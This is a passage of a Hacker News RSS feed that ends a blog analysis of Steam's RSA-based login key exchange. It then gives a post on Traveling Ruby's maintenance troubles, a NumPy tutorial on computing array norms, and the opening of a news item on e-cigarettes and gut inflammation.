password and you will (hopefully) be asked to enter a one-time token generated by your preferred two-factor authentication method. You can stop right there, because the magic I want to point out has already happened. You’ll find that pressing the login button launches a request against an odd endpoint: <code>/login/getrsakey</code>, followed by <code>/login/dologin</code>.</p><figure><img src="https://owlspace.xyz/images/steam-rsa/getrsa-call.png" alt="Requests to fetch script assets, acquire RSA key and perform login"><figcaption><p>All relevant assets and requests in succession</p></figcaption></figure><p>Inspect the request for <code>/login/getrsakey</code> and you’ll find a JSON-formatted response, containing fields with names that should look very familiar to anyone who’s briefly dealt with public key cryptography. You’re given a RSA public key, though the exact values might look a bit odd. It’s clear that <code>publickey_mod</code> and <code>publickey_exp</code> define the modulus and the exponent used in encryption, but the former is given in hexadecimal while the latter appears to be given in binary (I’ll get back on that later). There’s also a timestamp which has no immediately recognizable starting point. As to what the purpose of <code>token_gid</code> is, I have no clue yet.</p><div><pre><code data-lang="json"><span>{</span>
    <span>"success"</span><span>:</span><span>true</span><span>,</span>
    <span>"publickey_mod"</span><span>:</span><span>"c85ba44d5a3608561cb289795ac93b34d4b9b4326f9c09d1d19a9923e2d136b8..."</span><span>,</span>
    <span>"publickey_exp"</span><span>:</span><span>"010001"</span><span>,</span>
    <span>"timestamp"</span><span>:</span><span>"1260462250000"</span><span>,</span>
    <span>"token_gid"</span><span>:</span><span>"2701e0b0a4be3635"</span>
<span>}</span>
</code></pre></div><p>The login page pulls some scripts on load. There is the main login handler contained in <code>login.js</code> which is completely unobfuscated, so anyone can just analyze it and find out what it does. The site also loads some additional dependencies, namely <code>jsbn.js</code> and <code>rsa.js</code>.</p><p>A quick search for the name mentioned in the first line of <code>jsbn.js</code> reveals that these two scripts are the work of <a href="http://www-cs-students.stanford.edu/~tjw/">Tom Wu</a> — a MIT and Stanford graduate who likes software engineering and computer cryptography. They released <code>jsbn.js</code> and <code>rsa.js</code> as pure JavaScript implementations of arbitrary precision integers and RSA encryption/decryption respectively. You’ll also find that these libraries have had their most recent updates in 2005 and 2013 which is a bit of information I’ll come back to later. For now, just keep it in mind.</p><h3 id="going-down-the-rsabbit-hole">Going down the r(s)abbit hole</h3><p>So now that we have all relevant assets, let’s dig around in <code>login.js</code>. The code is a bit of a mess with lots of callbacks and proxied function calls, but it turns out the parts of interest can be easily condensed. In essence, the script can be boiled down to a couple of steps, each step assuming that everything went fine in the previous step.</p><ol><li>The user enters their username and password and presses the login button.</li><li><code>DoLogin</code> is called, which checks if the login mask was filled out correctly and launches a request against <code>/login/getrsakey</code>.</li><li><code>OnRSAKeyResponse</code> is called. This checks if the response is well-formed.</li><li><code>GetAuthCode</code> is called. It runs some platform-specific code in case there are any 2FA measures active on the user’s account.</li><li><code>OnAuthCodeResponse</code> is called. This is where the password is encrypted using RSA and the request against <code>/login/dologin</code> is prepared and executed.</li><li><code>OnLoginResponse</code> is called. The user is logged in and redirected to the Steam storefront.</li></ol><p>The code in <code>OnAuthCodeResponse</code> shows why the requested public key is formatted the way that it is. Starting at line 387 in the source file, the modulus and exponent of the <code>/login/getrsakey</code> response are passed as-is to the RSA library. The user’s password is then encrypted with the given public key and added to the request against <code>/login/dologin</code> in the subsequent login step.</p><div><pre><code data-lang="js"><span>var</span> <span>pubKey</span> <span>=</span> <span>RSA</span><span>.</span><span>getPublicKey</span><span>(</span><span>results</span><span>.</span><span>publickey_mod</span><span>,</span> <span>results</span><span>.</span><span>publickey_exp</span><span>);</span>
<span>var</span> <span>username</span> <span>=</span> <span>this</span><span>.</span><span>m_strUsernameCanonical</span><span>;</span>
<span>var</span> <span>password</span> <span>=</span> <span>form</span><span>.</span><span>elements</span><span>[</span><span>'password'</span><span>].</span><span>value</span><span>;</span>
<span>password</span> <span>=</span> <span>password</span><span>.</span><span>replace</span><span>(</span><span>/[^\x00-\x7F]/g</span><span>,</span> <span>''</span><span>);</span> <span>// remove non-standard-ASCII characters
</span><span></span><span>var</span> <span>encryptedPassword</span> <span>=</span> <span>RSA</span><span>.</span><span>encrypt</span><span>(</span><span>password</span><span>,</span> <span>pubKey</span><span>);</span>
</code></pre></div><p>I copied the source files onto my local machine to explore the RSA library a little bit. Both the modulus and the exponent are passed to the function <code>RSAPublicKey</code> which behaves like a constructor in the “pre-class” JavaScript era. <code>RSAPublicKey</code> simply wraps both values into instances of <code>BigInteger</code> provided by the <code>jsbn.js</code> script. It was to my surprise that the exponent is actually not represented in binary but, just like the modulus, in hexadecimal. (Also, turns out <code>0x010001</code> is a <a href="https://stackoverflow.com/questions/6098381/what-are-common-rsa-sign-exponent">very common encryption exponent</a> in RSA implementations.) So now it’s clear that the password encryption is based on 2048-bit RSA with an encryption exponent of 65537.</p><div><pre><code data-lang="js"><span>let</span> <span>r</span> <span>=</span> <span>RSA</span><span>.</span><span>getPublicKey</span><span>(</span><span>"c85ba44d5a360856..."</span> <span>/* insert your own long modulus here */</span><span>,</span> <span>"010001"</span><span>);</span>
<span>console</span><span>.</span><span>log</span><span>(</span><span>r</span><span>.</span><span>encryptionExponent</span><span>.</span><span>toString</span><span>());</span> <span>// =&gt; "65537"
</span><span></span><span>console</span><span>.</span><span>log</span><span>(</span><span>r</span><span>.</span><span>modulus</span><span>.</span><span>bitLength</span><span>());</span> <span>// =&gt; 2048
</span></code></pre></div><p>Moving on to the <code>timestamp</code> field. The <code>/login/getrsakey</code> response contains an <code>Expires</code> header. It references a date in the past, meaning that the response is absolutely not meant to be cached or persisted in any way. If you check back on <code>/login/getrsakey</code> over a longer period of time, you’ll notice that the public key changes ever so often and, as such, its timestamp value too. This means there’s only a limited time frame in which a certain Steam-issued RSA public key can be used to authenticate.</p><p>This becomes even more evident when examining the subsequent request against <code>/login/dologin</code>. Among many other things, it contains the username, encrypted password as well as the timestamp of the issued RSA public key. Trying to perform a login attempt while altering the timestamp fails as expected. But more importantly, it’s also not possible to reuse an older public key, even if the password is correctly encrypted.</p><p>I went one step further and <a href="https://gist.github.com/JoogsWasTaken/8a8e60859e1721255c57e9185eb6cb10">wrote a simple Python script to collect public keys</a> over the span of three days using a throwaway account. I let it run every five minutes using a cronjob. The goal was to check just how often Steam’s public keys change and to hopefully find out how the <code>timestamp</code> field behaves.</p><figure><img src="https://owlspace.xyz/images/steam-rsa/sqlite-pubkeys.png" alt="SQLite database containing public keys sourced from Steam"><figcaption><p>Lots and lots and lots of public keys</p></figcaption></figure><p>I found that the public key changes every 12 entries, meaning that it’s safe to assume that they rotate every hour. The encryption exponent stays the same — no surprises here. More intriguing however is the aforementioned <code>timestamp</code> field. For every 12 public keys, the value of the <code>timestamp</code> increases by a certain amount, namely 3600000000 and then some. And what’s more is that this number wraps around after some period of time as can be seen in the following image. Be warned, because all of what I’m about to say is highly speculative.</p><figure><img src="https://owlspace.xyz/images/steam-rsa/sqlite-wraparound.png" alt="Public key entries where the timestamp value wraps around in-between"><figcaption><p>Timestamp field wrapping around</p></figcaption></figure><p>I found that 3600000000 microseconds is equal to one hour, making me assume that the value of the <code>timestamp</code> field is, in fact, given in microseconds. However, I already hinted at the fact that the timestamp value doesn’t increase by one hour exactly with every new public key. In my own data, I observed that the difference between two successive timestamps is one hour plus 1 to 2.6 seconds, with most being in the order of about 1.05 to 1.25 seconds. But this raises another interesting possibility.</p><p>Let’s assume that a new public key is generated every hour plus one second. If I query the public key …</p></article></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://owlspace.xyz/cybersec/steam-login/">https://owlspace.xyz/cybersec/steam-login/</a></em></p>]]>
            </description>
            <link>https://owlspace.xyz/cybersec/steam-login/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25690995</guid>
            <pubDate>Fri, 08 Jan 2021 21:51:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Future of Traveling Ruby]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25690967">thread link</a>) | @kureikain
<br/>
January 8, 2021 | https://www.joyfulbikeshedding.com/blog/2021-01-06-the-future-of-traveling-ruby.html | <a href="https://web.archive.org/web/*/https://www.joyfulbikeshedding.com/blog/2021-01-06-the-future-of-traveling-ruby.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

<div>

<p>A couple of years ago, I had a dream: to make it dead-easy to distribute Ruby CLI apps to end users, without requiring those users to install Ruby or muck about with gems and Bundler. And thus <a href="https://phusion.github.io/traveling-ruby">Traveling Ruby</a> was born.</p>
<p>Traveling Ruby hasn't seen updates for quite a while now. Recently I tried making a new bugfix release, but I found it to be more challenging than I had hoped. In this article I reflect on those challenges, as well as on the future of Traveling Ruby.</p>

<h2 id="the-dream-of-a-single-self-contained-package">The dream of a single, self-contained package</h2>
<p>Back in the 90s, I wrote Windows desktop apps with Delphi. Unlike its contemporary competitors such as Visual Basic and Java, which generated apps that required users to install a runtime, Delphi produced a single .exe that just works. Fast forward to the mid 2010s, and we saw that Go – which could also produce a single executable that required no runtime – was gaining popularity. Sometimes at the expense of Ruby.</p>
<p>While Traveling Ruby doesn't produce a single executable, it allows you to package your Ruby app as a single self-contained directory, which is good enough.</p>
<h2 id="whats-needed-sustainability-and-democratization">What's needed: sustainability and democratization</h2>
<p>Traveling Ruby hasn't seen updates for quite a while now, but it's still being used. Yesterday, the author of the <a href="https://docs.pact.io/">Pact contract testing framework</a> asked me to do a new release, because he <a href="https://github.com/phusion/traveling-ruby/pull/94#issuecomment-754371791">needed a bug fix for supporting paths that contain spaces</a>. So I gave it a try. Predictably, the build system is broken due to all the changes in Linux and macOS the past few years, and fixing it all takes a lot of effort.</p>
<p>However, this is not a sustainable. The reason why Traveling Ruby stopped getting updates after a while is because it's too dependent on a single maintainer: myself. The main contributing factor to why there's only a single maintainer, is that maintaining Traveling Ruby requires <a href="https://github.com/phusion/traveling-ruby/issues/88#issuecomment-336400119">expert knowledge on C-based build systems and binary compatibility</a> for both Linux and macOS. This is a low-level skill that's not commonly found in the Ruby community.</p>
<p>The same issue potentially threatens <a href="https://fullstaqruby.org/">Fullstaq Ruby</a>, which is my current main focus. Fullstaq Ruby also requires skills in the areas of C-based build systems, and OS packaging. This time I've learned my lesson, so I <a href="https://www.joyfulbikeshedding.com/blog/2020-05-15-why-fullstaq-ruby.html">seek to make Fullstaq Ruby sustainable</a> through these strategies:</p>
<ul>
<li><strong>Automation</strong> of as many maintenance tasks as possible.</li>
<li><strong>Knowledge sharing</strong> through documentation. Allow anyone to learn the required skills, and clearly describe all the maintenance procedures.</li>
<li><strong>Actively recruiting</strong> more maintainers.</li>
</ul>
<p>These strategies are not easily implemented, and take time.</p>
<p>I hope to revive Traveling Ruby's vision one day. A successor project should employ the same strategies to ensure the sustainability of the project. A successor project should aim for <strong>democratization</strong>: making it easy for <em>anyone</em> to contribute.</p>
<h2 id="challenges">Challenges</h2>
<p>In Traveling Ruby's case, macOS seems to be doing everything it can to prevent democratization from being realized.</p>
<p>Building Traveling Ruby requires setting up an isolated, carefully-controlled build environment. In Linux this is easy: spin up a Docker container. MacOS has no native containers: Docker for Mac is merely a Linux VM; containers don't run macOS inside. So we try to set up such an environment by using environment variables. However, some things cannot be isolated, such as random libraries in /usr/local. So this gives maintainers two options:</p>
<ol>
<li>While maintaining Traveling Ruby, temporarily clear elements that may pollute the build environment. When done with the maintenance work, restore those elements.</li>
<li>Set up an entirely new, clean macOS instance, specifically for the purpose of maintaining Traveling Ruby. Preferably, make this a CI server so that we can automate things.</li>
</ol>
<p>Option 1 is easier than 2, but it's a <em>hassle</em>, and not automated.</p>
<p>Option 2 is very bad too:</p>
<ul>
<li>Setting up a macOS CI server is very expensive, money-wise. This is because its license only allows running on Apple hardware. This means buying or renting dedicated Apple hardware, as opposed to spinning up virtualized cloud instances that run on commodity hardware.</li>
<li>Setting up a macOS CI server is very expensive, time- and effort-wise. Virtualization is a great way to backup, restore and reset the CI server. But macOS is neither a good server OS, nor a good virtualization host. Installing Linux on Apple hardware is not an easy task. Installing macOS in a production-grade virtualizion platform, such as KVM, is also not an easy task.</li>
<li>Thanks to the restrictive licensing, there are very few hosting providers that offer macOS. MacStadium and Amazon Web Services are all that I can think of. All of them are very expensive.</li>
</ul>
<p>What about CI providers, such as Azure DevOps and Github Actions? I hoped that they would bring about more democratization. Unfortunately, there are more roadblocks, making those options entirely unfeasible.</p>
<p>macOS's increasingly restrictive security features, conflict with Traveling Ruby's build environment. In particular, we rely on <code>DYLD_LIBRARY_PATH</code>, but this doesn't work when System Integrity Protection (SIP) is enabled. Disabling SIP on managed CI instances such as Azure DevOps or Github Actions is not possible. I don't know whether disabling SIP on MacStadium and AWS is possible.</p>
<p>This means that we'll need a dedicated Mac machine for maintainers to use. Someone has to buy it, build it and maintain it. This makes that someone a potential bottleneck.</p>
<p>macOS also evolves in much more impactful ways than Linux. This makes knowledge sharing hard, because the knowledge must be ever-evolving. Maintainers must be experts that both understand the underlying issues, as well as keep up with the latest changes, so that they can debug new problems. Finding out that <code>DYLD_LIBRARY_PATH</code> stopped working due to System Integrity Protection, is an example of an obscure problem that's not easily diagnosed by those with insufficient knowledge of macOS's internals.</p>
<h2 id="conclusion">Conclusion</h2>
<p>Making a successor to Traveling Ruby, that's sustainable and democratized, is no easy task, in large thanks to macOS. I have no easy answers to these challenges: it seems that there's no option but to bite the bullet. I hope that its dream will be fulfilled some day, because I love Ruby.</p>
</div>

</article></div>]]>
            </description>
            <link>https://www.joyfulbikeshedding.com/blog/2021-01-06-the-future-of-traveling-ruby.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25690967</guid>
            <pubDate>Fri, 08 Jan 2021 21:48:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Calculating the norm of an array in NumPy]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25690944">thread link</a>) | @jbencook
<br/>
January 8, 2021 | https://jbencook.com/numpy-norm/ | <a href="https://web.archive.org/web/*/https://jbencook.com/numpy-norm/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article role="main">
        <p>A norm is a measure of the size of a matrix or vector and you can compute it in NumPy with the <code>np.linalg.norm()</code> function<a href="https://jbencook.com/numpy-norm/#notes">[1]</a>:</p>

<div><div><pre><code><span>import</span> <span>numpy</span> <span>as</span> <span>np</span>

<span>x</span> <span>=</span> <span>np</span><span>.</span><span>eye</span><span>(</span><span>4</span><span>)</span>
<span>np</span><span>.</span><span>linalg</span><span>.</span><span>norm</span><span>(</span><span>x</span><span>)</span>

<span># Expected result
# 2.0
</span></code></pre></div></div>

<p>When <code>np.linalg.norm()</code> is called on an array-like input without any additional arguments, the default behavior is to compute the L2 norm on a flattened view of the array. This is the <a href="https://jbencook.com/numpy-square-root">square root</a> of the sum of <a href="https://jbencook.com/numpy-square">squared</a> elements and can be interpreted as the length of the vector in Euclidean space.</p>

<!--more-->

<p>Since the <code>ravel()</code> method flattens an array without making any copies and <code>ord</code> specifies the type of norm that will be computed, the above usage is equivalent to:</p>

<div><div><pre><code><span>np</span><span>.</span><span>linalg</span><span>.</span><span>norm</span><span>(</span><span>x</span><span>.</span><span>ravel</span><span>(),</span> <span>ord</span><span>=</span><span>2</span><span>)</span>

<span># Expected result
# 2.0
</span></code></pre></div></div>

<p><em>But watch out!</em> The function can calculate many different kinds of norms. And if you specify the <code>ord</code> argument, then matrices (arrays with <code>ndim=2</code>) are treated differently than vectors (arrays with <code>ndim=1</code>). This leads to a somewhat surprising result:</p>

<div><div><pre><code><span>np</span><span>.</span><span>linalg</span><span>.</span><span>norm</span><span>(</span><span>x</span><span>,</span> <span>ord</span><span>=</span><span>2</span><span>)</span>

<span># Expected result
# 1.0
</span></code></pre></div></div>

<p>That is, even though <code>ord=2</code> is the default behavior for vectors (and for vectors <code>ord=2</code> <em>does</em> mean L2 norm),  <code>np.linalg.norm(x, ord=2)</code> does <em>not</em> compute the L2 norm if x has more than 1 dimension. In fact, somewhat stupidly, <code>ord=2</code> actually means something different for matrices in <code>np.linalg.norm()</code>.</p>

<p>In order to avoid getting tricked by this behavior, it’s worth taking a look at the API and some example use cases.</p>

<h3 id="api">API</h3>

<p>The <code>np.linalg.norm()</code> function has three important arguments: <code>x</code>, <code>ord</code>, and <code>axis</code> <a href="#notes">[2]</a>.</p>

<ul>
  <li><code>x</code>: this is an array-like input. If <code>ord</code> and <code>axis</code> are both <code>None</code>, then <code>np.linalg.norm()</code> will return the L2 norm of <code>x.ravel()</code>, which is a flattened (i.e. 1-dimensional) view of the array.</li>
  <li><code>ord</code>: the type of norm. If you just pass in <code>x</code> and <code>ord</code> leaving <code>axis</code> as <code>None</code>, then <code>x</code> must be 1-dimensional or 2-dimensional, otherwise you will get an exception. Most commonly, when <code>x</code> is a vector, you will want <code>ord=2</code> or <code>ord=1</code> for L2 and L1 norms respectively. And when <code>x</code> is a matrix, you will want <code>ord='fro'</code> for the Frobenius norm. But NumPy does support other norms which you can look up in <a href="https://numpy.org/doc/stable/reference/generated/numpy.linalg.norm.html">their docs</a>.</li>
  <li><code>axis</code>: the axis (or axes) to reduce with the norm operation. If this is an <code>int</code> then you will get vector norms along that dimension and if this is a 2-tuple, then you will get matrix norms along those dimensions.</li>
</ul>

<p>That’s all a little too confusing for my preference. So instead of worrying about the combination of the number of dimensions of your <code>x</code> argument and <code>ord</code>, my recommendation is to use <code>x</code> by itself when you want an L2 norm or Frobenius norm (which is the same as the L2 norm on the flattened matrix):</p>



<p>Sometimes the <code>ord</code> and <code>axis</code> arguments are unavoidable (and I’ll show an example below), but only if 1) you need to reduce one or two of the dimensions or 2) you want to compute a norm other than L2.</p>

<h3 id="examples">Examples</h3>

<h4 id="relative-error">Relative error</h4>

<p>Let’s start with an easy example. A great use case for norms is computing the relative error between two arrays. For scalars, relative error is usually calculated with <code>|x - x'| / |x|</code>. Think of this like the size of the difference divided by the size of the original number.</p>

<p>Since norms are a way to encode the size of an array with a single number, you can use norms to do something very similar for arrays:</p>

<div><div><pre><code><span>x_prime</span> <span>=</span> <span>x</span> <span>+</span> <span>np</span><span>.</span><span>random</span><span>.</span><span>uniform</span><span>(</span><span>0</span><span>,</span> <span>0.1</span><span>)</span>
<span>np</span><span>.</span><span>linalg</span><span>.</span><span>norm</span><span>(</span><span>x_prime</span> <span>-</span> <span>x</span><span>)</span> <span>/</span> <span>np</span><span>.</span><span>linalg</span><span>.</span><span>norm</span><span>(</span><span>x</span><span>)</span>

<span># Expected result like...
# 0.05465174120478311
</span></code></pre></div></div>

<p>Easy!</p>

<h4 id="normalization">Normalization</h4>

<p>You can normalize an array in order to force it to have a norm that you specify. For example, you can generate a random array that has an L2 norm of (approximately) 3. Just multiply every element by 3 and divide by the L2 norm:</p>

<div><div><pre><code><span>x</span> <span>=</span> <span>np</span><span>.</span><span>random</span><span>.</span><span>uniform</span><span>(</span><span>size</span><span>=</span><span>10</span><span>)</span>
<span>x</span> <span>=</span> <span>3</span> <span>*</span> <span>x</span> <span>/</span> <span>np</span><span>.</span><span>linalg</span><span>.</span><span>norm</span><span>(</span><span>x</span><span>)</span>
<span>np</span><span>.</span><span>linalg</span><span>.</span><span>norm</span><span>(</span><span>x</span><span>)</span>

<span># Expected result
</span><span>2.9999999999999996</span>
</code></pre></div></div>

<p>If you wanted the vector have a unit norm, you would simply divide every element by the norm.</p>

<p>Sometimes, you may want to do this for your dataset. Say you have a matrix of data where every row is a sample and every column is a feature. If you want every row to have a unit norm, you can:</p>

<ol>
  <li>Compute the row-wise norms (reducing the column dimension)</li>
  <li>Divide every element by its row norm</li>
</ol>

<p>Here’s the code to normalize rows by their L2 norms for a randomly generated dataset with 10 rows and 3 columns:</p>

<div><div><pre><code><span>data</span> <span>=</span> <span>np</span><span>.</span><span>random</span><span>.</span><span>uniform</span><span>(</span><span>size</span><span>=</span><span>(</span><span>10</span><span>,</span> <span>3</span><span>))</span>
<span>row_l2_norms</span> <span>=</span> <span>np</span><span>.</span><span>linalg</span><span>.</span><span>norm</span><span>(</span><span>data</span><span>,</span> <span>axis</span><span>=</span><span>1</span><span>)</span>
<span>data</span> <span>/=</span> <span>row_l2_norms</span><span>[:,</span> <span>None</span><span>]</span>

<span># Now the rows all have a L2 norm of 1
</span><span>np</span><span>.</span><span>linalg</span><span>.</span><span>norm</span><span>(</span><span>data</span><span>,</span> <span>axis</span><span>=</span><span>1</span><span>)</span>

<span># Expected result
</span><span>array</span><span>([</span><span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>])</span>
</code></pre></div></div>

<p>Notice: <code>row_l2_norms</code> will be a vector with size 10. If we want to use broadcasting rules to divide every element in <code>data</code>, which has shape <code>(10, 3)</code>, we need to add a dummy dimension to give <code>row_l2_norms</code> shape <code>(10, 1)</code>. That’s what the <a href="https://jbencook.com/adding-a-dimension-to-a-tensor-in-pytorch"><code>None</code> index is doing</a>.</p>

<p>Additionally, since the input is a matrix and we’re passing in <code>axis=1</code>, the function will compute the vector norm of each row. This means it’s safe to pass in <code>ord=1</code> to get the row-wise L1 norms:</p>

<div><div><pre><code><span>data</span> <span>=</span> <span>np</span><span>.</span><span>random</span><span>.</span><span>uniform</span><span>(</span><span>size</span><span>=</span><span>(</span><span>10</span><span>,</span> <span>3</span><span>))</span>
<span>row_l1_norms</span> <span>=</span> <span>np</span><span>.</span><span>linalg</span><span>.</span><span>norm</span><span>(</span><span>data</span><span>,</span> <span>ord</span><span>=</span><span>1</span><span>,</span> <span>axis</span><span>=</span><span>1</span><span>)</span>
<span>data</span> <span>/=</span> <span>row_l1_norms</span><span>[:,</span> <span>None</span><span>]</span>

<span># Now the rows all have a L1 norm of 1
</span><span>np</span><span>.</span><span>linalg</span><span>.</span><span>norm</span><span>(</span><span>data</span><span>,</span> <span>ord</span><span>=</span><span>1</span><span>,</span> <span>axis</span><span>=</span><span>1</span><span>)</span>

<span># Expected result
</span><span>array</span><span>([</span><span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>])</span>
</code></pre></div></div>

<p>This would <em>not</em> work if <code>data</code> had more than 2 dimensions.</p>

<p>By the way, scikit-learn provides a convenience function so you can more easily normalize rows of a dataset to have L1 or L2 unit norms. Here’s an example of normalizing every row by its L1 norm:</p>

<div><div><pre><code><span>from</span> <span>sklearn</span> <span>import</span> <span>preprocessing</span>

<span>data</span> <span>=</span> <span>np</span><span>.</span><span>random</span><span>.</span><span>uniform</span><span>(</span><span>size</span><span>=</span><span>(</span><span>10</span><span>,</span> <span>3</span><span>))</span>
<span>data</span> <span>=</span> <span>preprocessing</span><span>.</span><span>normalize</span><span>(</span><span>data</span><span>,</span> <span>norm</span><span>=</span><span>'l1'</span><span>)</span>

<span># Now the rows all have a L1 norm of 1
</span><span>np</span><span>.</span><span>linalg</span><span>.</span><span>norm</span><span>(</span><span>data</span><span>,</span> <span>ord</span><span>=</span><span>1</span><span>,</span> <span>axis</span><span>=</span><span>1</span><span>)</span>

<span># Expected result
</span><span>array</span><span>([</span><span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>])</span>
</code></pre></div></div>

<h4 id="pairwise-distance">Pairwise distance</h4>

<p>You can also use <code>np.linalg.norm()</code> to compute pairwise Euclidean distance between two sets of points. This is a little more involved and I have a separate post on that <a href="https://jbencook.com/pairwise-distance-in-numpy">here</a>.</p>

<h3 id="notes">Notes</h3>
<p>[1]: The same function is available as <code>scipy.linalg.norm()</code>. But you should never need to use it since 1) the API is the same and 2) if you have SciPy installed in your environment, then you also have NumPy.</p>

<p>[2]: <code>np.linalg.norm()</code> does accept other arguments, but you probably don’t need to use them.</p>

      </article></div>]]>
            </description>
            <link>https://jbencook.com/numpy-norm/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25690944</guid>
            <pubDate>Fri, 08 Jan 2021 21:46:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Study: E-cigarettes trigger inflammation in the gut]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25690888">thread link</a>) | @finphil
<br/>
January 8, 2021 | https://nuadox.com/post/639780077299695616/e-cigarettes-gut-inflammation | <a href="https://web.archive.org/web/*/https://nuadox.com/post/639780077299695616/e-cigarettes-gut-inflammation">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> 
                 
                    
                    <article id="639780077299695616">
                        <div>
                            <div>
                                <a href="https://nuadox.com/post/639780077299695616/e-cigarettes-gut-inflammation"><h2>Study: E-cigarettes trigger inflammation in the gut</h2></a>
                                <figure data-orig-width="1920" data-orig-height="1280"><img src="https://64.media.tumblr.com/719adc344f9d012b68317d81612ff379/1c0ff7a9c3fdd454-cc/s1280x1920/e5552cbe243605bda059375f95029aa3b5896fe1.jpg" alt="image" data-orig-width="1920" data-orig-height="1280" width="1280" height="853"></figure><p><b>- By&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fhealth.ucsd.edu%2Fnews%2Fpages%2Fcontacts.aspx&amp;t=M2JmZTdmZWMxMjhhOTVkNGFlMTI3N2Q2ODlkNjAyN2U3NGIzNGVkNywyeTAyd2poeQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F639780077299695616%2Fe-cigarettes-gut-inflammation&amp;m=0&amp;ts=1610355519">Jeanna Vazquez</a> , <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fucsd.edu%2F&amp;t=YjM0Mzg3ODhkYjYyZDhmNWY4MGUzY2QxNGE4OTBkZGMwMTNjNGJhNCwyeTAyd2poeQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F639780077299695616%2Fe-cigarettes-gut-inflammation&amp;m=0&amp;ts=1610355519">UC San Diego</a> -</b></p><p>Touted by makers as a “healthy” alternative to traditional nicotine cigarettes, new research indicates the chemicals found in e-cigarettes disrupt the gut barrier and trigger inflammation in the body, potentially leading to a variety of health concerns. </p><p>In the study, published Jan. 5, 2021 in the journal <i><a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.cell.com%2Fiscience%2Ffulltext%2FS2589-0042%2821%2900003-1&amp;t=NTBkODNlZjdlYmU0ZWUxODljMzBjZmE5NTZiMGViMjZjMWY5YTlkMiwyeTAyd2poeQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F639780077299695616%2Fe-cigarettes-gut-inflammation&amp;m=0&amp;ts=1610355519">iScience</a></i>, Soumita Das, PhD, associate professor of pathology, and Pradipta Ghosh, MD, professor of cellular and molecular medicine at UC San Diego School of Medicine and Moores Cancer Center at UC San Diego School of Medicine, with colleagues, found that chronic use of nicotine-free e-cigarettes led to a “leaky gut,” in which microbes and other molecules seep out of the intestines, resulting in chronic inflammation. Such inflammation can contribute to a variety of diseases and conditions, including inflammatory bowel disease, dementia, certain cancers, atherosclerosis, liver fibrosis, diabetes and arthritis. </p><p>“The gut lining is an amazing entity. It is comprised of a single layer of cells that are meant to seal the body from the trillions of microbes, defend our immune system, and at the same time allow absorption of essential nutrients,” said Ghosh. “Anything we eat or drink, our lifestyle choices in other words, has the ability to impact our gut microbes, the gut barrier and overall health. Now we know that what we smoke, such as e-cigarettes, negatively impacts it as well.”</p><p>The researchers found that two chemicals used as a base for all e-cigarette liquid vapor — propylene glycol and vegetable glycerol — were the cause of inflammation.</p><p>“Numerous chemicals are created when these two are heated to generate the fumes in vaping that cause the most damage, for which there are no current regulations,” said Ghosh. “The safety of e-cigarettes have been debated fiercely on both sides. Nicotine content, and its addictive nature, has always been the major focus of those who argue against its safety, whereas lack of chemicals in the carcinogens that are present in the cigarette smoke has been touted by the makers of e-cigarettes when marketing these products as a ‘healthy alternative.’ In reality, it’s the chemicals making up the vapor liquid that we should be more concerned about as they are the cause of gut inflammation.” &nbsp;</p><p>For the study, the team used 3D models of human intestinal tracts generated from patient cells and simulated what happens when e-cigarette vapors enter the gut lining. Researchers validated the findings using mice models of vaping in collaboration with Laura Crotty-Alexander, MD, associate professor of medicine in the Division of Pulmonary, Critical Care and Sleep Medicine at UC San Diego School of Medicine and section chief of Pulmonary Critical Care at Veterans Affairs San Diego Healthcare System.</p><p>To produce the 3D gut organoids, the researchers collected stem cells from patients’ biopsies during colonoscopies and grew them in vitro. The stem cells differentiated into the four different cell types that make up the gut lining. The team then exposed the organoids to e-cigarette liquid vapor, mimicking the frequency of a chronic vaper.</p><figure data-orig-width="640" data-orig-height="400"><img src="https://64.media.tumblr.com/4cd0a7df45ff92ad73c77d47869af825/1c0ff7a9c3fdd454-ab/s640x960/5d6405078c464994050bbc8bc369bc2296633165.jpg" alt="image" data-orig-width="640" data-orig-height="400" width="640" height="400"></figure><p><i>Image: In the bottom frames, burst cell junctions in the gut lining can be seen after being exposed to e-cigarette chemicals as compared to healthy cells in the top frames. Credit: <a 